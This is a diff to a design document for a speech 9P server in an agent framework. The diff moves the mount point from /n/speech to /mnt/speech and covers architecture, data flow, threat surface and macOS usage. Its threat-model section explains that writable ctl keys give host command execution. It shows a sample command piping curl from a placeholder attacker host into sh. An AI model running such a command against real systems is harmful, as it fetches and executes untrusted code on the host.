@@ -21,7 +21,7 @@ flowchart LR
         devC["#C devcmd<br/>/cmd/clone"]
         devA["#A audio<br/>/dev/audio"]
         speech9p["speech9p<br/>(serveloop + spawned TTS)"]
-        mount[("/n/speech/<br/>ctl · say · hear · voices")]
+        mount[("/mnt/speech/<br/>ctl · say · hear · voices")]
 
         subgraph cons["Consumers"]
             sayTool["Veltro tool: say<br/>(agent)"]
@@ -55,16 +55,16 @@ flowchart LR
 |---------------------------------|-------------------------------------|------|
 | `speech9p`                      | `appl/veltro/speech9p.b`            | The 9P server. Routes ctl/say/hear/voices to engine backends. |
 | `module/speech.m`               | `module/speech.m`                   | Abstract `TTSEngine`/`STTEngine` interface (currently descriptive — speech9p in-lines its three backends rather than loading separate engine modules). |
-| `say` tool                      | `appl/veltro/tools/say.b`           | Veltro tool that opens `/n/speech/say` and writes text. veltrosrv intercepts the agent's `say` calls (§7.1). |
-| `hear` tool                     | `appl/veltro/tools/hear.b`          | Veltro tool that writes `start <ms>` to `/n/speech/hear` and reads the transcription back. |
+| `say` tool                      | `appl/veltro/tools/say.b`           | Veltro tool that opens `/mnt/speech/say` and writes text. veltrosrv intercepts the agent's `say` calls (§7.1). |
+| `hear` tool                     | `appl/veltro/tools/hear.b`          | Veltro tool that writes `start <ms>` to `/mnt/speech/hear` and reads the transcription back. |
 | `lucibridge` auto-speak         | `appl/cmd/lucibridge.b` (`/voice`, `-s`) | Sets an `autospeak` flag and registers the Speech resource; nothing speaks responses at present (`speaktext()` was removed in `483af071`). |
-| `nsconstruct` / `tools9p` glue  | `appl/veltro/nsconstruct.b`, `tools9p.b:applynsrestriction` | Auto-grants `/n/speech` to a `say` or `hear` tool invocation. |
+| `nsconstruct` / `tools9p` glue  | `appl/veltro/nsconstruct.b`, `tools9p.b:applynsrestriction` | Auto-grants `/mnt/speech` to a `say` or `hear` tool invocation. |
 
 ## 2. Filesystem
 
 ```mermaid
 flowchart LR
-    root["/n/speech/"] --> ctl["ctl (rw)<br/>read: dump config<br/>write: key=val"]
+    root["/mnt/speech/"] --> ctl["ctl (rw)<br/>read: dump config<br/>write: key=val"]
     root --> say["say (rw)<br/>write: text → speak<br/>read: last status"]
     root --> hear["hear (rw)<br/>write: start [dur_ms]<br/>read: transcription"]
     root --> voices["voices (r)<br/>list voices for current engine"]
@@ -88,7 +88,7 @@ sub-directories). Permissions:
 ### 2.1 ctl protocol
 
 ```
-read /n/speech/ctl  →  engine cmd
+read /mnt/speech/ctl  →  engine cmd
                        voice samantha
                        lang en
                        rate 22050
@@ -99,10 +99,10 @@ read /n/speech/ctl  →  engine cmd
 ```
 
 ```
-write /n/speech/ctl <- engine api
-write /n/speech/ctl <- voice nova
-write /n/speech/ctl <- apikey sk-...
-write /n/speech/ctl <- pipermodel /opt/piper/models/en_US-lessac-medium.onnx
+write /mnt/speech/ctl <- engine api
+write /mnt/speech/ctl <- voice nova
+write /mnt/speech/ctl <- apikey sk-...
+write /mnt/speech/ctl <- pipermodel /opt/piper/models/en_US-lessac-medium.onnx
 ```
 
 | Key            | Values                                          | Notes |
@@ -185,11 +185,11 @@ flowchart TD
 
 `-e local` is accepted by the option parser in `init` (`speech9p.b`, the
 `'e'` case); an unknown engine name prints an error and the usage message.
-`echo 'engine local' > /n/speech/ctl` also switches at runtime.
+`echo 'engine local' > /mnt/speech/ctl` also switches at runtime.
 
 ## 4. Data flow
 
-### 4.1 TTS — write to `/n/speech/say`
+### 4.1 TTS — write to `/mnt/speech/say`
 
 ```mermaid
 sequenceDiagram
@@ -230,7 +230,7 @@ responsive while a 10-second `say` runs in the background. Callers who
 need to know the TTS finished must read the same fid back; in practice
 neither the agent tool nor lucibridge bothers — speech is fire-and-forget.
 
-### 4.2 STT — read from `/n/speech/hear`
+### 4.2 STT — read from `/mnt/speech/hear`
 
 ```mermaid
 sequenceDiagram
@@ -362,7 +362,7 @@ The mitigation that actually matters is *piping text via stdin*. The
 `sanitize()` helper (replaces single quotes only) is a defence-in-depth
 veneer; do not rely on it for untrusted input on the cmd line. Note also
 that `cmdtts` and `cmdstt` from ctl are *concatenated into shell strings*
-and passed to `sh -c`. An attacker who can write `/n/speech/ctl` can
+and passed to `sh -c`. An attacker who can write `/mnt/speech/ctl` can
 execute arbitrary host commands. The threat model assumes ctl is only
 writable by trusted local processes (see §8).
 
@@ -400,7 +400,7 @@ binary opens the host's mic *directly* (`ffmpeg` via avfoundation,
 
 ## 7. Veltro and lucibridge integration
 
-Two paths were designed to feed `/n/speech/say`: an agent's tool call and
+Two paths were designed to feed `/mnt/speech/say`: an agent's tool call and
 the GUI's auto-speak mode. The GUI path is not currently wired (§7.3), and
 the agent loop in veltrosrv intercepts `say` calls (§7.1). The diagram
 shows the design.
@@ -424,13 +424,13 @@ flowchart TB
     end
 
     subgraph nsgate["nsconstruct + tools9p"]
-        gate{caps.paths includes<br/>/n/speech?<br/>or say/hear<br/>tool registered?}
+        gate{caps.paths includes<br/>/mnt/speech?<br/>or say/hear<br/>tool registered?}
     end
 
     sayTool --> gate
     hearTool --> gate
-    gate -- yes --> mount[("/n/speech/say<br/>/n/speech/hear")]
-    gate -- no --> blocked["✗ namespace strips<br/>/n/speech"]
+    gate -- yes --> mount[("/mnt/speech/say<br/>/mnt/speech/hear")]
+    gate -- no --> blocked["✗ namespace strips<br/>/mnt/speech"]
 
     bridge --> mount
     speech9p["speech9p backend"] --> mount
@@ -448,8 +448,8 @@ flowchart TB
 
 `appl/veltro/tools/say.b` is intentionally trivial:
 
-1. Parse optional `-v voice` and write `voice <name>` to `/n/speech/ctl`.
-2. Open `/n/speech/say` and write the text.
+1. Parse optional `-v voice` and write `voice <name>` to `/mnt/speech/ctl`.
+2. Open `/mnt/speech/say` and write the text.
 3. Return `ok` (or an error if speech9p isn't mounted).
 
 It does **not** wait for TTS to finish (which matches speech9p's async
@@ -465,7 +465,7 @@ it as its own conversation bubble.
 
 `appl/veltro/tools/hear.b`:
 
-1. Open `/n/speech/hear`.
+1. Open `/mnt/speech/hear`.
 2. Write `start <duration_ms>` (default 5000, capped at 60000).
 3. Read until EOF and return the transcription (or `"(no speech detected)"`).
 
@@ -478,31 +478,31 @@ blocks the speech9p serveloop for the same duration.
 Not currently wired. The `/voice on|off` slash command and `lucibridge -s`
 still set an `autospeak` flag, and with it lucibridge registers a Speech
 resource in the context zone; `/voice <name>` writes `voice <name>` to
-`/n/speech/ctl`. The function that spoke each response, `speaktext()`,
+`/mnt/speech/ctl`. The function that spoke each response, `speaktext()`,
 was removed when the agent loop moved to veltrosrv (`483af071`), and
 nothing in the tree has taken its place.
 
 As it was: every assistant response was passed through
 `agentlib->stripmarkdown()` (still in `appl/veltro/agentlib.b`) and written
-to `/n/speech/say`, with the Speech resource set `active`, then `idle` once
+to `/mnt/speech/say`, with the Speech resource set `active`, then `idle` once
 the write returned (before audio finished playing).
 
 ### 7.4 Namespace gating
 
 By default a Veltro agent's namespace strips `/n` down to whatever
-`caps.paths` allows. `/n/speech` would therefore be invisible to most
+`caps.paths` allows. `/mnt/speech` would therefore be invisible to most
 agents. Two mechanisms ensure say/hear actually work:
 
 - **Auto-grant in tools9p** (`applynsrestriction()` in `tools9p.b`): when
-  the invoked tool is `say` or `hear`, `/n/speech` is added to `allpaths`
+  the invoked tool is `say` or `hear`, `/mnt/speech` is added to `allpaths`
   automatically.
-- **Grant in nsconstruct** (`restrictns()` in `nsconstruct.b`): if `/n/speech` is
-  in `caps.paths` *and* it actually exists on the host, it's added to
-  the agent's `nallow` list.
+- **Grant in nsconstruct** (`restrictns()` in `nsconstruct.b`): a
+  `/mnt/speech` in `caps.paths` is an ordinary `/mnt` path grant, exposed
+  only if it exists (it moved from `/n/speech`, INFR-403).
 
-Both predicates check `sys->stat("/n/speech")` so an agent in a session
-without speech9p running does not get a stale mountpoint — the namespace
-just doesn't include it, and the tool reports `error: /n/speech not
+So an agent in a session without speech9p running does not get a stale
+mountpoint — the namespace
+just doesn't include it, and the tool reports `error: /mnt/speech not
 mounted`.
 
 ## 8. Threat surface
@@ -527,7 +527,7 @@ flowchart LR
 
     op --> ctlrce
     ctlrce --> hostshell
-    agent -- "auto-grant /n/speech" --> mount["/n/speech/say<br/>/n/speech/hear"]
+    agent -- "auto-grant /mnt/speech" --> mount["/mnt/speech/say<br/>/mnt/speech/hear"]
     gui --> mount
     mount -. "ctl is in same dir" .-> ctlrce
     api_leak -. "if engine=api" .-> mount
@@ -542,7 +542,7 @@ flowchart LR
 
 | Surface                | Risk                                                                                       | Mitigation today                                                                 |
 |------------------------|---------------------------------------------------------------------------------------------|----------------------------------------------------------------------------------|
-| `/n/speech/ctl` write  | `cmdtts`/`cmdstt`/`piperbin`/`whisperbin` are concatenated into `sh -c` strings → RCE on host. | Trust `/n/speech/ctl` to trusted writers only. **Do not expose ctl to agents** — currently nothing strips it from the auto-granted namespace. |
+| `/mnt/speech/ctl` write  | `cmdtts`/`cmdstt`/`piperbin`/`whisperbin` are concatenated into `sh -c` strings → RCE on host. | Trust `/mnt/speech/ctl` to trusted writers only. **Do not expose ctl to agents** — currently nothing strips it from the auto-granted namespace. |
 | `apikey` in memory     | Stored in cleartext as a Limbo string; any compromise of the emu reveals it.               | Same posture as factotum keys. Do not run untrusted code in the same emu.        |
 | `apikey` on the wire   | API requests go over plain HTTPS (`sslconnect`) but no certificate pinning.                 | Pin at the network layer if needed; trust your TLS stack.                        |
 | Microphone access      | Any STT engine path activates the host mic. The agent can request `hear` and listen to the room. | Disable `hear` via tools9p config when the user isn't expecting an STT prompt.   |
@@ -559,10 +559,10 @@ flowchart LR
   are installed.
 - If using the `api` engine, scope the API key to TTS/STT only; do not
   reuse a chat-completion key for the speech endpoint unless you have to.
-- Treat `/n/speech/ctl` as a privileged file. The auto-grant in
-  `tools9p.b` (`applynsrestriction()`) and `nsconstruct.b` adds the *whole `/n/speech`
+- Treat `/mnt/speech/ctl` as a privileged file. The auto-grant in
+  `tools9p.b` (`applynsrestriction()`) and `nsconstruct.b` adds the *whole `/mnt/speech`
   directory* to agent namespaces — agents that have `say` or `hear` can
-  also `echo 'cmdtts curl evil.example.com | sh' > /n/speech/ctl`. A
+  also `echo 'cmdtts curl evil.example.com | sh' > /mnt/speech/ctl`. A
   hardening pass that exposes only `say` and `hear` (e.g. `bind -b` of
   individual files into the agent ns) is on the road map.
 
@@ -571,7 +571,7 @@ flowchart LR
 ```mermaid
 flowchart LR
     subgraph today["Today"]
-        l2["read /n/speech/hear blocks serveloop"]
+        l2["read /mnt/speech/hear blocks serveloop"]
         l3["ctl reachable from agents<br/>that have say/hear"]
         l4["/dev/audio exclusive use"]
         l5["No streaming TTS or STT"]
@@ -606,7 +606,7 @@ flowchart LR
 1. **`-e local` rejected by the CLI parser** — fixed; `init` now accepts
    it.
 2. **STT blocks the serveloop.** Until `dohear()` is spawned the same way
-   `dosay()` is, only one client at a time can use `/n/speech` while STT
+   `dosay()` is, only one client at a time can use `/mnt/speech` while STT
    is running.
 3. **Agents see `ctl`, not just `say`/`hear`.** The auto-grant exposes the
    whole tree. A capability-style approach would bind individual files.
@@ -614,7 +614,7 @@ flowchart LR
    audio blocks for the full duration.
 5. **Voice rewriting on `api`** silently changes intent — `voice samantha`
    becomes `voice alloy`. Documented here; user-visible warning would help.
-6. **Status read is misleading.** A read of `/n/speech/say` returns the
+6. **Status read is misleading.** A read of `/mnt/speech/say` returns the
    string set by `asyncsay` *as soon as TTS exits*, but for the macOS
    `say` path that's after audio has played; for the API path that's
    after `playpcm` has *queued* PCM, which may finish playing later. Don't
@@ -627,7 +627,7 @@ flowchart LR
 
 A concrete walk-through of every speech9p path on a stock macOS bundle.
 Use this as the reference for what actually happens when you press
-**Tab → "speak this"** or write text into `/n/speech/say` from the shell.
+**Tab → "speak this"** or write text into `/mnt/speech/say` from the shell.
 
 ### 10.1 Bring-up
 
@@ -639,7 +639,7 @@ sequenceDiagram
     participant det as detectplatform
     participant init as initplatform
     participant sp as speech9p server
-    participant ns as /n/speech mount
+    participant ns as /mnt/speech mount
 
     emu->>prof: source profile (after bind ~/.infernode overlays)
     prof->>sp: /dis/veltro/speech9p.dis -e cmd &
@@ -647,11 +647,11 @@ sequenceDiagram
     det-->>sp: "MacOSX"  → "macos"
     sp->>init: case "macos"
     Note over init: cmdtts := "say"<br/>cmdstt := "whisper-cli"<br/>voice := "samantha"<br/>audrate := 22050, chans := 1, bits := 16
-    sp->>ns: ensuredir /n/speech<br/>mount fds[1] MREPL|MCREATE
+    sp->>ns: ensuredir /mnt/speech<br/>mount fds[1] MREPL|MCREATE
     ns-->>sp: ready
 ```
 
-After `lib/sh/profile` runs, `cat /n/speech/ctl` returns:
+After `lib/sh/profile` runs, `cat /mnt/speech/ctl` returns:
 
 ```
 engine cmd
@@ -687,7 +687,7 @@ sequenceDiagram
     participant ca as CoreAudio<br/>→ speakers
 
     user->>tool: say "Hello world"
-    tool->>FS: open + write "Hello world" → /n/speech/say
+    tool->>FS: open + write "Hello world" → /mnt/speech/say
     FS->>FS: fs.sayreq = "Hello world"
     FS-->>tool: Rwrite (immediate)
     tool-->>user: "ok"
@@ -709,7 +709,7 @@ sequenceDiagram
 What's worth knowing:
 
 - `voice = "samantha"` is hard-coded for macOS by `initplatform`. To use
-  another macOS voice, write `echo 'voice fred' > /n/speech/ctl` first,
+  another macOS voice, write `echo 'voice fred' > /mnt/speech/ctl` first,
   or run the say tool with `say -v fred Hello`.
 - The text is **piped to `say`'s stdin**, not put on its command line —
   `runcmd_stdin` opens the cmd device's data file for both stdin (write
@@ -718,13 +718,13 @@ What's worth knowing:
 - The full shell command actually executed on the host is
   `/bin/sh -c 'say -v samantha'`. The `'…'` quoting around the command
   itself is constructed by `runcmd_stdin` (`speech9p.b:960`).
-- `cat /n/speech/say` after the call returns `ok`. That value is set the
+- `cat /mnt/speech/say` after the call returns `ok`. That value is set the
   moment `say` exits — i.e. *after* the audio plays, because macOS `say`
   blocks until playback completes.
 - The agent / shell already returned **immediately at step 4**. Tens of
   seconds of audio happen in the background.
 
-To list available macOS voices: `cat /n/speech/voices` runs
+To list available macOS voices: `cat /mnt/speech/voices` runs
 `runcmd("say -v \\?")` which executes `/bin/sh -c 'say -v ?'` on the
 host and pipes the output back through `/cmd/N/data`.
 
@@ -746,10 +746,10 @@ sequenceDiagram
     participant mic as host mic (avfoundation :0)
 
     user->>tool: hear 5000
-    tool->>FS: write "start 5000" → /n/speech/hear
+    tool->>FS: write "start 5000" → /mnt/speech/hear
     FS->>FS: fs.hearresp = nil<br/>hearduration = 5000
     FS-->>tool: Rwrite
-    tool->>FS: read /n/speech/hear
+    tool->>FS: read /mnt/speech/hear
     activate FS
     Note over FS: ⚠ inline in serveloop —<br/>blocks all 9P traffic
     FS->>rec: runcmd("ffmpeg -y -f avfoundation -i :0 -t 5 -ar 16000 -ac 1 -sample_fmt s16 /tmp/speech_stt.wav")
@@ -783,7 +783,7 @@ macOS-specific gotchas:
   AirPods or an external interface and want a different device, you'd
   need to patch `hearcmd_macos` — there is no ctl key for it.
 - The **5-second window blocks the speech9p serveloop**. During those
-  five seconds, any other reader of `/n/speech` will queue. After STT
+  five seconds, any other reader of `/mnt/speech` will queue. After STT
   finishes, the serveloop unblocks. The `say` tool keeps working
   immediately because *its* read of the say fid doesn't go through
   `dohear`.
@@ -810,11 +810,11 @@ audio device entirely.
 
 ```sh
 # inside emu, with secstore unlocked or a key in env
-echo 'engine api' > /n/speech/ctl
-echo 'apiurl https://api.openai.com/v1' > /n/speech/ctl
-echo 'apikey '$ANTHROPIC_API_KEY > /n/speech/ctl   # or factotum-derived
-echo 'voice nova' > /n/speech/ctl
-echo 'Hello from the cloud' > /n/speech/say
+echo 'engine api' > /mnt/speech/ctl
+echo 'apiurl https://api.openai.com/v1' > /mnt/speech/ctl
+echo 'apikey '$ANTHROPIC_API_KEY > /mnt/speech/ctl   # or factotum-derived
+echo 'voice nova' > /mnt/speech/ctl
+echo 'Hello from the cloud' > /mnt/speech/say
 ```
 
 What changes vs. §10.2:
@@ -838,11 +838,11 @@ default stays `cmd`; if you `brew install piper` and download a voice
 model, you can flip manually:
 
 ```sh
-echo 'engine local' > /n/speech/ctl
-echo 'piperbin /opt/homebrew/bin/piper' > /n/speech/ctl
-echo 'pipermodel /opt/homebrew/share/piper/voices/en_US-lessac-medium.onnx' > /n/speech/ctl
-echo 'whispermodel /opt/homebrew/share/whisper-cpp/models/ggml-base.en.bin' > /n/speech/ctl
-echo 'Hello from local neural TTS' > /n/speech/say
+echo 'engine local' > /mnt/speech/ctl
+echo 'piperbin /opt/homebrew/bin/piper' > /mnt/speech/ctl
+echo 'pipermodel /opt/homebrew/share/piper/voices/en_US-lessac-medium.onnx' > /mnt/speech/ctl
+echo 'whispermodel /opt/homebrew/share/whisper-cpp/models/ggml-base.en.bin' > /mnt/speech/ctl
+echo 'Hello from local neural TTS' > /mnt/speech/say
 ```
 
 The flow becomes the diagram in §4.1's "engine = local" branch. STT now
@@ -854,12 +854,12 @@ switch on Intel macs where the cmd path is broken (§10.3).
 
 | Symptom                                                 | Cause                                                                                  | Fix |
 |---------------------------------------------------------|----------------------------------------------------------------------------------------|-----|
-| `say` works but voice always sounds the same            | Voice was set on the wrong fid; ctl writes don't survive emu restart.                  | `echo 'voice fred' > /n/speech/ctl` after each boot, or patch `initplatform`. |
+| `say` works but voice always sounds the same            | Voice was set on the wrong fid; ctl writes don't survive emu restart.                  | `echo 'voice fred' > /mnt/speech/ctl` after each boot, or patch `initplatform`. |
 | `hear` returns `error: transcription failed`            | Hard-coded `/opt/homebrew/share/whisper-cpp/...` model path doesn't exist (Intel mac, custom brew prefix, model not downloaded). | Switch to `engine local` and set `whispermodel` via ctl. |
 | `hear` returns `(no speech detected)` but mic is loud   | First-run macOS microphone permission prompt was dismissed.                            | Grant Microphone access to the launching Terminal/app in System Settings → Privacy → Microphone, then retry. |
 | `engine api` TTS produces no sound                      | `/dev/audio` not bound or held by another client (Inferno audio driver issue).         | Stick with `engine cmd` on macOS unless you specifically need API voices. |
 | `voice samantha` becomes Alloy on api engine            | Hard-coded fallback in `sayapi` (`speech9p.b:531`).                                               | Set an explicit OpenAI-known voice (`alloy`/`echo`/`fable`/`nova`/`onyx`/`shimmer`). |
-| `cat /n/speech/voices` lists hundreds of voices         | `say -v ?` enumerates every installed voice, including the multi-language ones.        | Working as intended; pipe through `grep` to filter. |
+| `cat /mnt/speech/voices` lists hundreds of voices         | `say -v ?` enumerates every installed voice, including the multi-language ones.        | Working as intended; pipe through `grep` to filter. |
 
 ## 11. Pointers
 
